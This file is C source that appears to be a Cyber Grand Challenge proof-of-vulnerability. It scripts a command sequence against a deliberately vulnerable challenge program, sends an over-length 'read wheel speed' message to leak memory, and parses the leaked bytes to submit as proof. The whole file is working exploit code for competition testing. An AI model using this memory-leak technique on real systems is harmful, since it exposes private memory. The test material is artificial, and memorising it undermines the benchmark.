/*

Author: Jason Williams <jdw@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include "libpov.h"

int cgc_IsHexChar( char val )
{
	if ( val >= 'a' && val <= 'f' )
		return (1);
	else if ( val >= 'A' && val <= 'F' )
		return (1);
	else if ( val >= '0' && val <= '9' )
		return (1);
	else
		return (0);
}

uint8_t cgc_HexCharToInt( char val )
{
	if ( val >= 'a' && val <= 'f' )
		return (10 + (val-'a'));
	else if ( val >= 'A' && val <= 'F' )
		return (10 + (val-'A'));
	else if ( val >= '0' && val <= '9' )
		return (0 + (val-'0'));
	else
		return (0);
}

cgc_size_t cgc_ReadBytes( int fd, char *buf, cgc_size_t len ) 
{
	cgc_size_t total_bytes = 0;
	cgc_size_t rx_bytes;
	char c;
				        
	while (total_bytes < len) 
	{
		if (cgc_receive(fd, &c, 1, &rx_bytes) != 0) 
                	return(0);
								                
		if (rx_bytes == 0) 
			return (0);

		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

cgc_size_t cgc_RecvUntil(int fd, char delim, char *buf, cgc_size_t maxlen) 
{
	cgc_size_t total_bytes = 0;
	cgc_size_t rx_bytes = 0;
	char c;

	while ( total_bytes < maxlen-1 )
	{
		if ( cgc_receive( fd, &c, 1, &rx_bytes ) != 0 )
			return (0);

		if ( rx_bytes == 0 )
			return (0);

		if ( c == delim )
			break;

		buf[total_bytes++] = c;
	}

	buf[total_bytes] = '\0';

	return (total_bytes);
}

cgc_size_t cgc_SendBytes(int fd, char *buf, cgc_size_t len) 
{
	cgc_size_t tx_bytes;
	cgc_size_t total_bytes = 0;

	while ( total_bytes < len )
	{
		if ( cgc_transmit( fd, buf+total_bytes, 1, &tx_bytes ) != 0 )
			return (0);

		if ( tx_bytes != 1 )
			return (0);

		total_bytes++;
	}

	return(total_bytes);
}

void cgc_NegotiateType2Pov(unsigned int *type2_addr, unsigned int *type2_size, unsigned int *type2_length) 
{
	unsigned int PovType = 2;
	
	// Request Type 2 negotitation
	if (cgc_SendBytes(3, (char *)&PovType, 4) != 4)
		cgc__terminate(-1);

	// get the 4-byte value for type2_addr
	if (cgc_ReadBytes(3, (char *)type2_addr, 4) != 4)
		cgc__terminate(-1);

	// get the 4-byte size for type_size
	if (cgc_ReadBytes(3, (char *)type2_size, 4) != 4)
		cgc__terminate(-1);
			
	// get the 4-byte value for type2_length
	if (cgc_ReadBytes(3, (char *)type2_length, 4) != 4)
		cgc__terminate(-1);

}

void cgc_SendCommand( const char *pszCommandData )
{
	cgc_size_t command_len = cgc_strlen( pszCommandData );

	cgc_SendBytes( 1, (char *)pszCommandData, command_len );
	// transmit_all( 1, (unsigned char *)pszCommandData, command_len );
}

void cgc_ConsumeLines( cgc_size_t lineCount )
{
	char szMaxLineLen[2048];

	// Limitation -- only 2048 bytes until line is cgc_read!
	for ( cgc_size_t count = 0; count < lineCount; count++ )
		cgc_RecvUntil( 0, '\n', szMaxLineLen, 2048 );
}

int main(int cgc_argc, char *cgc_argv[]) 
{
	// ipmask -- mask of CB/RB instruction pointer
	// regmask -- mask of CB/RB register (specified by third argument)
	// 0 - eax, 1 - ecx, 2 - edx, 3 - ebx, 4 - esp, 5 - ebp, 6 - esi, 7 - edi
   	
	// Negotiate type2 -- populate t2vals
	unsigned char *read_data = NULL;
	unsigned int read_len = 0;
	int read_res;	
	int i;

	unsigned char same_line_delimiter[] = ": ";
	unsigned char new_line_delimiter[] = "\n";

	unsigned int type2_addr;
	unsigned int type2_size;
	unsigned int type2_length;

	cgc_NegotiateType2Pov( &type2_addr, &type2_size, &type2_length );

	// Read command count
	read_res = cgc_delimited_read( 0, &read_data, &read_len, same_line_delimiter, 2 );
	cgc_SendCommand( "3\n" );

	// Read source ID
	read_res = cgc_delimited_read( 0, &read_data, &read_len, same_line_delimiter, 2 );
	cgc_SendCommand( "0\n" );

	// Read Dest ID
	read_res = cgc_delimited_read( 0, &read_data, &read_len, same_line_delimiter, 2 );
	cgc_SendCommand( "19\n" );

	// Read 13 lines
	for ( i = 0; i < 13; i++ )
		read_res = cgc_delimited_read( 0, &read_data, &read_len, new_line_delimiter, 1 );

	cgc_SendCommand( "7\n" );

	// Read 2 lines
	for ( i = 0; i < 2; i++ )
		read_res = cgc_delimited_read( 0, &read_data, &read_len, new_line_delimiter, 1 );

	cgc_SendCommand( "25\n" );
	// Now send TCM enable command
	
	// Get source ID	
	read_res = cgc_delimited_read( 0, &read_data, &read_len, same_line_delimiter, 2 );
	cgc_SendCommand( "0\n" );

	// Get Dest ID
	read_res = cgc_delimited_read( 0, &read_data, &read_len, same_line_delimiter, 2 );
	cgc_SendCommand( "20\n" );

	// Read 13 lines
	for ( i = 0; i < 13; i++ )
		read_res = cgc_delimited_read( 0, &read_data, &read_len, new_line_delimiter, 1 );
	
	cgc_SendCommand( "11\n" );

	// Read 2 lines
	for ( i = 0; i < 2; i++ )
		read_res = cgc_delimited_read( 0, &read_data, &read_len, new_line_delimiter, 1 );

	// 125 milliseconds
	cgc_SendCommand( "125\n" );	
	
	// Read send binary message
	read_res = cgc_delimited_read( 0, &read_data, &read_len, same_line_delimiter, 2 );

	// Send TCM start command	
	cgc_SendCommand( "03010001\n" );
	
	// Read Enter Source ID
	read_res = cgc_delimited_read( 0, &read_data, &read_len, same_line_delimiter, 2 );
	cgc_SendCommand( "0\n" );

	// Read Dest ID
	read_res = cgc_delimited_read( 0, &read_data, &read_len, same_line_delimiter, 2 );
	cgc_SendCommand( "20\n" );

	// Read 13 lines
	for ( i = 0; i < 13; i++ )
		read_res = cgc_delimited_read( 0, &read_data, &read_len, new_line_delimiter, 1 );
	
	cgc_SendCommand( "11\n" );

	// Read 2 lines
	for ( i = 0; i < 2; i++ )
		read_res = cgc_delimited_read( 0, &read_data, &read_len, new_line_delimiter, 1 );

	cgc_SendCommand( "225\n" );

	// Read enter binary message
	read_res = cgc_delimited_read( 0, &read_data, &read_len, same_line_delimiter, 2 );

	// Send cgc_read wheel speed command -- exceed the length and cgc_read the equipment ID -- it should leak 64-bits or 8-bytes of data
	cgc_SendCommand( "010600010406070809\n" );

	// Consume 13 lines...	
	for ( i = 0; i < 13; i++ )
		read_res = cgc_delimited_read( 0, &read_data, &read_len, new_line_delimiter, 1 );

	read_res = cgc_delimited_read( 0, &read_data, &read_len, new_line_delimiter, 1 );

	const char *szExpectLine = "[MESSAGE][SRC=20][DEST=0][LENGTH=13]\n";

	if ( read_len != cgc_strlen(szExpectLine) )
	{
		char *szBlah = "0000";
		cgc_SendBytes( 3, (char *)szBlah, 4 );
		cgc__terminate(-1);
	}

	if ( cgc_memcmp( read_data, szExpectLine, read_len ) != 0 )
		cgc__terminate(-1);

	// Next line has equipment ID -- which is type 2 memory leak
	read_res = cgc_delimited_read( 0, &read_data, &read_len, new_line_delimiter, 1 );

	if ( read_len < 26 )
		cgc__terminate(-1);
	else
	{
		// Convert
		uint8_t pov2_data[8];

		cgc_size_t pos_source = 10;
		cgc_size_t count = 0;
		cgc_size_t out_pos = 0;

		for ( count = 0; count < 8; count++ )
		{
			pov2_data[out_pos] = 0;

			if ( !cgc_IsHexChar( read_data[pos_source] ) )
				cgc__terminate(-1);

			pov2_data[out_pos] = (cgc_HexCharToInt( read_data[pos_source] ) << 4);

			pos_source++;

			if ( !cgc_IsHexChar( read_data[pos_source] ) )
				cgc__terminate(-1);

			pov2_data[out_pos] |= (cgc_HexCharToInt( read_data[pos_source] ));

			out_pos++;
			pos_source++;
		}

		cgc_SendBytes( 3, (char *)pov2_data, 4 );
	}
}
